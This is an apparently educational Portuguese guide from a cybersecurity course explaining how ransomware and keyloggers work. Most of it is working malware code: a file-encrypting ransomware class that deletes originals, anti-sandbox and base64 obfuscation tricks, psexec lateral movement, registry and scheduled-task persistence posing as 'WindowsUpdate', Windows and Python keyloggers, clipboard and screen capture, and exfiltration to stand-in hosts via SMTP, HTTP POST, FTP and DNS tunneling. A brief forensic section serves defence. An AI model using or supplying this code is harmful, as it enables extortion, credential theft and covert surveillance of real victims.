# ğŸ“– Como os Malwares Funcionam

## IntroduÃ§Ã£o

Este documento explica em detalhes o funcionamento tÃ©cnico dos malwares estudados neste projeto: **Ransomware** e **Keylogger**. O entendimento do mecanismo interno dessas ameaÃ§as Ã© fundamental para desenvolver defesas eficazes.

---

## ğŸ¦  Anatomia de um Malware

### Ciclo de Vida Geral

```
1. DESENVOLVIMENTO
   â†“
2. DISTRIBUIÃ‡ÃƒO (Vetor de ataque)
   â†“
3. INFECÃ‡ÃƒO (ExploraÃ§Ã£o)
   â†“
4. EXECUÃ‡ÃƒO (Payload)
   â†“
5. PERSISTÃŠNCIA
   â†“
6. COMUNICAÃ‡ÃƒO (C&C)
   â†“
7. OBJETIVO FINAL
```

### Componentes Comuns

**Dropper/Loader**
- Primeira etapa da infecÃ§Ã£o
- Baixa e instala o payload principal
- Geralmente pequeno e ofuscado

**Payload**
- CÃ³digo malicioso principal
- Executa a funÃ§Ã£o destrutiva/maliciosa
- Ransomware: criptografa; Keylogger: captura

**Rootkit** (opcional)
- Oculta a presenÃ§a do malware
- Modifica o sistema operacional
- Dificulta detecÃ§Ã£o e remoÃ§Ã£o

**C&C (Command and Control)**
- ComunicaÃ§Ã£o com servidor do atacante
- Recebe comandos
- Envia dados roubados

---

## ğŸ” Ransomware: Funcionamento Detalhado

### Fluxo de Ataque

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  1. VETOR DE ENTRADA                    â”‚
â”‚     â€¢ E-mail phishing                   â”‚
â”‚     â€¢ Download malicioso                â”‚
â”‚     â€¢ Exploit kit                       â”‚
â”‚     â€¢ RDP comprometido                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  2. EXECUÃ‡ÃƒO INICIAL                    â”‚
â”‚     â€¢ Dropper se executa                â”‚
â”‚     â€¢ Verifica ambiente (anti-sandbox)  â”‚
â”‚     â€¢ Eleva privilÃ©gios                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  3. COMUNICAÃ‡ÃƒO COM C&C                 â”‚
â”‚     â€¢ Registra infecÃ§Ã£o                 â”‚
â”‚     â€¢ Recebe chave de criptografia      â”‚
â”‚     â€¢ ObtÃ©m instruÃ§Ãµes                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  4. DESCOBERTA DE ARQUIVOS              â”‚
â”‚     â€¢ Varre sistema de arquivos         â”‚
â”‚     â€¢ Identifica arquivos valiosos      â”‚
â”‚     â€¢ Prioriza documentos/imagens/DBs   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  5. CRIPTOGRAFIA                        â”‚
â”‚     â€¢ Gera chave Ãºnica por arquivo      â”‚
â”‚     â€¢ Criptografa conteÃºdo              â”‚
â”‚     â€¢ Renomeia arquivo                  â”‚
â”‚     â€¢ Deleta originais                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  6. LIMPEZA DE RASTROS                  â”‚
â”‚     â€¢ Deleta Shadow Copies              â”‚
â”‚     â€¢ Apaga logs                        â”‚
â”‚     â€¢ Remove pontos de restauraÃ§Ã£o      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  7. EXIBIÃ‡ÃƒO DE RESGATE                 â”‚
â”‚     â€¢ Cria arquivo de nota              â”‚
â”‚     â€¢ Muda wallpaper                    â”‚
â”‚     â€¢ Exibe janela popup                â”‚
â”‚     â€¢ Fornece instruÃ§Ãµes de pagamento   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### TÃ©cnicas de Criptografia

#### Criptografia SimÃ©trica + AssimÃ©trica

**Abordagem HÃ­brida (mais comum):**

```python
# PseudocÃ³digo de ransomware moderno

# 1. Atacante gera par de chaves RSA
public_key_attacker, private_key_attacker = generate_rsa_keypair()

# 2. Chave pÃºblica Ã© embutida no malware
# 3. No sistema da vÃ­tima:

for arquivo in arquivos_alvo:
    # Gera chave AES Ãºnica por arquivo
    aes_key = generate_random_aes_key()
    
    # Criptografa arquivo com AES (rÃ¡pido)
    arquivo_criptografado = aes_encrypt(arquivo, aes_key)
    
    # Criptografa a chave AES com RSA pÃºblica do atacante
    aes_key_encrypted = rsa_encrypt(aes_key, public_key_attacker)
    
    # Salva a chave criptografada com o arquivo
    save(arquivo_criptografado + aes_key_encrypted)
    
    # Deleta original
    secure_delete(arquivo)

# 4. Para descriptografar, Ã© necessÃ¡ria a chave RSA privada do atacante
```

**Por que hÃ­brido?**
- AES: rÃ¡pido para grandes arquivos
- RSA: seguro para proteger a chave
- Chave AES Ãºnica por arquivo: mais seguro

#### Algoritmos Comuns

| Algoritmo | Tipo | Velocidade | SeguranÃ§a |
|-----------|------|------------|-----------|
| AES-256 | SimÃ©trico | âš¡âš¡âš¡ | ğŸ”’ğŸ”’ğŸ”’ |
| RSA-2048 | AssimÃ©trico | âš¡ | ğŸ”’ğŸ”’ğŸ”’ |
| ChaCha20 | SimÃ©trico | âš¡âš¡âš¡ | ğŸ”’ğŸ”’ğŸ”’ |
| Salsa20 | SimÃ©trico | âš¡âš¡âš¡ | ğŸ”’ğŸ”’ |

### Exemplo de ImplementaÃ§Ã£o Educacional

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
import os

class RansomwareSimulator:
    def __init__(self):
        # Gera par de chaves RSA (normalmente feito pelo atacante)
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        self.public_key = self.private_key.public_key()
    
    def encrypt_file(self, file_path):
        # 1. Gera chave AES aleatÃ³ria
        aes_key = os.urandom(32)  # 256 bits
        iv = os.urandom(16)
        
        # 2. LÃª arquivo original
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # 3. Criptografa com AES
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        # 4. Criptografa a chave AES com RSA
        encrypted_aes_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # 5. Salva: chave_criptografada + IV + dados_criptografados
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(len(encrypted_aes_key).to_bytes(4, 'big'))
            f.write(encrypted_aes_key)
            f.write(iv)
            f.write(ciphertext)
        
        # 6. Deleta original
        os.remove(file_path)
    
    def decrypt_file(self, file_path):
        # Requer chave privada RSA
        with open(file_path, 'rb') as f:
            key_length = int.from_bytes(f.read(4), 'big')
            encrypted_aes_key = f.read(key_length)
            iv = f.read(16)
            ciphertext = f.read()
        
        # Descriptografa chave AES
        aes_key = self.private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        # Descriptografa arquivo
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Salva arquivo original
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(plaintext)
```

### TÃ©cnicas AvanÃ§adas

#### 1. EvasÃ£o de DetecÃ§Ã£o

**Anti-Sandbox:**
```python
import time
import os

def is_sandbox():
    """Detecta se estÃ¡ rodando em sandbox/VM"""
    # Verifica tempo de execuÃ§Ã£o
    start = time.time()
    time.sleep(1)
    if time.time() - start < 0.9:  # AceleraÃ§Ã£o de tempo
        return True
    
    # Verifica arquivos de VM
    vm_files = [
        'C:\\windows\\system32\\drivers\\vmmouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys'
    ]
    if any(os.path.exists(f) for f in vm_files):
        return True
    
    return False

if is_sandbox():
    # Comporta-se normalmente
    exit(0)
else:
    # Executa payload malicioso
    execute_ransomware()
```

**OfuscaÃ§Ã£o de CÃ³digo:**
```python
# Antes
def encrypt_files():
    for file in files:
        encrypt(file)

# Depois (ofuscado)
exec(__import__('base64').b64decode('ZGVmIGVuY3J5cHRfZmlsZXMoKTo='))
```

#### 2. Movimento Lateral

```python
# Tenta se espalhar na rede
import socket
import subprocess

def spread_to_network():
    # Descobre hosts na rede
    for ip in range(1, 255):
        target = f"192.168.1.{ip}"
        
        # Tenta explorar SMB
        try:
            subprocess.run([
                'psexec.exe',
                f'\\\\{target}',
                '-u', 'admin',
                '-p', 'password',
                'ransomware.exe'
            ])
        except:
            pass
```

#### 3. PersistÃªncia

```python
import winreg
import os

def create_persistence():
    """Garante que o malware serÃ¡ executado no boot"""
    
    # Adiciona ao registro
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_WRITE
    )
    winreg.SetValueEx(
        key, 'WindowsUpdate', 0,
        winreg.REG_SZ,
        os.path.abspath(__file__)
    )
    winreg.CloseKey(key)
    
    # Cria tarefa agendada
    os.system(f'schtasks /create /tn "WindowsUpdate" /tr "{__file__}" /sc onlogon')
```

### Ransomware Famosos

#### WannaCry (2017)

**CaracterÃ­sticas:**
- Explorou vulnerabilidade EternalBlue (SMB)
- Worm (auto-propagaÃ§Ã£o)
- Afetou 200.000+ computadores
- Exigia pagamento em Bitcoin

**CÃ³digo de propagaÃ§Ã£o:**
```python
# Simplificado
def exploit_eternalblue(target_ip):
    # Envia exploit SMB
    send_smb_exploit(target_ip)
    # Executa payload
    execute_remote(target_ip, 'wannacry.exe')
```

#### Ryuk (2018-presente)

**CaracterÃ­sticas:**
- Ataques direcionados (targeted)
- Desabilita backups
- Resgates altos (milhÃµes)
- Usado por grupos APT

#### REvil/Sodinokibi (2019-2021)

**CaracterÃ­sticas:**
- Ransomware-as-a-Service (RaaS)
- Double extortion (criptografia + vazamento)
- Ataques Ã  supply chain

---

## âŒ¨ï¸ Keylogger: Funcionamento Detalhado

### Arquitetura de Captura

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        USUÃRIO PRESSIONA TECLA          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         DRIVER DE TECLADO                â”‚
â”‚    (Gera evento de hardware)             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      WINDOWS INPUT SYSTEM                â”‚
â”‚   (Processa evento de entrada)           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      KEYLOGGER INTERCEPTA                â”‚
â”‚   â€¢ Hook de teclado                      â”‚
â”‚   â€¢ Captura antes da aplicaÃ§Ã£o           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         APLICAÃ‡ÃƒO DESTINO                â”‚
â”‚   (Recebe a tecla normalmente)           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### MÃ©todos de Captura

#### 1. Hooks de Sistema (Windows)

**SetWindowsHookEx:**

```c
// Exemplo em C (Windows API)
#include <windows.h>

HHOOK hKeyboardHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            // Captura a tecla
            DWORD vkCode = p->vkCode;
            
            // Loga em arquivo
            FILE *fp = fopen("keylog.txt", "a");
            fprintf(fp, "%c", vkCode);
            fclose(fp);
        }
    }
    
    // Passa para o prÃ³ximo hook
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int main() {
    // Instala hook de teclado de baixo nÃ­vel
    hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        NULL,
        0
    );
    
    // Loop de mensagens
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}
```

**ImplementaÃ§Ã£o Python com pynput:**

```python
from pynput import keyboard

def on_press(key):
    try:
        # Teclas alfanumÃ©ricas
        char = key.char
        with open('keylog.txt', 'a') as f:
            f.write(char)
    except AttributeError:
        # Teclas especiais
        with open('keylog.txt', 'a') as f:
            f.write(f'[{key}]')

# Inicia listener
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

#### 2. Polling (GetAsyncKeyState)

```python
import ctypes
import time

user32 = ctypes.WinDLL('user32', use_last_error=True)

def poll_keyboard():
    """Verifica estado do teclado periodicamente"""
    while True:
        for i in range(256):
            # Verifica se tecla foi pressionada
            if user32.GetAsyncKeyState(i) & 0x0001:
                # Converte cÃ³digo para caractere
                char = chr(i)
                print(f"Tecla: {char}")
        
        time.sleep(0.01)  # 10ms

poll_keyboard()
```

**Vantagens:** Simples, nÃ£o requer hooks  
**Desvantagens:** Ineficiente, pode perder teclas rÃ¡pidas

#### 3. Kernel-Mode Driver

```c
// Driver de kernel (muito simplificado)
#include <ntddk.h>

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Intercepta IRP de leitura do teclado
    // Muito complexo e requer assinatura digital
    
    return STATUS_SUCCESS;
}
```

**CaracterÃ­sticas:**
- NÃ­vel mais baixo (kernel)
- DifÃ­cil de detectar
- Requer privilÃ©gios elevados
- Assinatura digital necessÃ¡ria (Windows)

### TÃ©cnicas de EvasÃ£o

#### 1. ExecuÃ§Ã£o Furtiva

```python
import sys
import os

def run_hidden():
    """Executa sem janela visÃ­vel"""
    if sys.platform == 'win32':
        import win32gui
        import win32con
        
        # ObtÃ©m handle da janela do console
        window = win32gui.GetForegroundWindow()
        
        # Esconde janela
        win32gui.ShowWindow(window, win32con.SW_HIDE)
```

#### 2. Nome de Processo Enganoso

```python
import sys
import os

# Renomeia processo para parecer legÃ­timo
if sys.platform == 'win32':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    
    # SetConsoleTitleW
    kernel32.SetConsoleTitleW("Windows Update Service")
```

#### 3. OfuscaÃ§Ã£o de Logs

```python
import base64
from cryptography.fernet import Fernet

class ObfuscatedKeylogger:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def log_key(self, key):
        # Criptografa antes de salvar
        encrypted = self.cipher.encrypt(key.encode())
        
        with open('.system.dat', 'ab') as f:
            f.write(encrypted + b'\n')
```

### Captura AvanÃ§ada

#### 1. Screenshot em Intervalos

```python
from PIL import ImageGrab
import time

def capture_screenshots():
    """Captura tela periodicamente"""
    while True:
        # Captura tela
        screenshot = ImageGrab.grab()
        
        # Salva com timestamp
        filename = f"screen_{int(time.time())}.png"
        screenshot.save(filename)
        
        # Aguarda 5 minutos
        time.sleep(300)
```

#### 2. Captura de Clipboard

```python
import win32clipboard

def monitor_clipboard():
    """Monitora Ã¡rea de transferÃªncia"""
    last_data = ""
    
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            if data != last_data:
                log(f"Clipboard: {data}")
                last_data = data
        except:
            pass
        
        time.sleep(1)
```

#### 3. Contexto da AplicaÃ§Ã£o

```python
import win32gui

def get_active_window():
    """Identifica aplicaÃ§Ã£o ativa"""
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    return title

def enhanced_keylogger():
    """Keylogger com contexto"""
    current_window = ""
    
    def on_press(key):
        nonlocal current_window
        
        window = get_active_window()
        if window != current_window:
            log(f"\n\n[Janela: {window}]\n")
            current_window = window
        
        log(str(key))
```

### ExfiltraÃ§Ã£o de Dados

#### 1. E-mail (SMTP)

```python
import smtplib
from email.mime.text import MIMEText

def send_logs_email(logs):
    msg = MIMEText(logs)
    msg['Subject'] = 'System Logs'
    msg['From'] = 'attacker@gmail.com'
    msg['To'] = 'attacker@gmail.com'
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('attacker@gmail.com', 'password')
    server.send_message(msg)
    server.quit()
```

#### 2. HTTP POST

```python
import requests

def send_logs_http(logs):
    url = 'http://attacker.com/receive.php'
    data = {'logs': logs, 'victim_id': 'ABC123'}
    requests.post(url, data=data)
```

#### 3. FTP

```python
from ftplib import FTP

def send_logs_ftp(filename):
    ftp = FTP('attacker-server.com')
    ftp.login('user', 'pass')
    
    with open(filename, 'rb') as f:
        ftp.storbinary(f'STOR {filename}', f)
    
    ftp.quit()
```

#### 4. DNS Tunneling

```python
import base64
import dns.resolver

def exfiltrate_via_dns(data):
    """Exfiltra dados via consultas DNS"""
    # Codifica dados
    encoded = base64.b64encode(data.encode()).decode()
    
    # Divide em chunks (DNS tem limite de 255 caracteres)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    for chunk in chunks:
        # Faz consulta DNS
        domain = f"{chunk}.attacker-domain.com"
        try:
            dns.resolver.resolve(domain, 'A')
        except:
            pass
```

### Keyloggers Famosos

#### 1. Zeus/Zbot (2007)
- Trojan bancÃ¡rio
- Capturava credenciais
- Botnet de milhÃµes

#### 2. Olympic Vision (2008)
- Instalado em hotÃ©is
- Alvo: executivos e diplomatas
- OperaÃ§Ã£o de espionagem

#### 3. Snake Keylogger (2020-presente)
- Keylogger + infostealer
- DistribuÃ­do via phishing
- Captura senhas de navegadores

---

## ğŸ”¬ AnÃ¡lise Forense

### Artefatos de Ransomware

**Registro do Windows:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

**Arquivos criados:**
- Nota de resgate (README.txt, HOW_TO_DECRYPT.html)
- ExecutÃ¡vel do ransomware
- Chaves de criptografia (Ã s vezes)

**Logs do sistema:**
```powershell
# Event Viewer
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4688}
```

### Artefatos de Keylogger

**Processos suspeitos:**
```powershell
Get-Process | Where-Object {$_.ProcessName -match "key|log|capture"}
```

**ConexÃµes de rede:**
```powershell
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
```

**Arquivos de log:**
- keylog.txt, log.dat, .system.dat
- Geralmente em %APPDATA%, %TEMP%

---

## ğŸ¯ ConclusÃ£o

Compreender o funcionamento interno de malwares Ã© essencial para:

1. **Desenvolver defesas eficazes**
2. **Identificar indicadores de compromisso**
3. **Responder adequadamente a incidentes**
4. **Educar usuÃ¡rios sobre riscos**

**Lembre-se:** Este conhecimento deve ser usado **exclusivamente** para defesa e educaÃ§Ã£o, nunca para atividades maliciosas.

---

**Desenvolvido para o Desafio DIO - CiberseguranÃ§a**
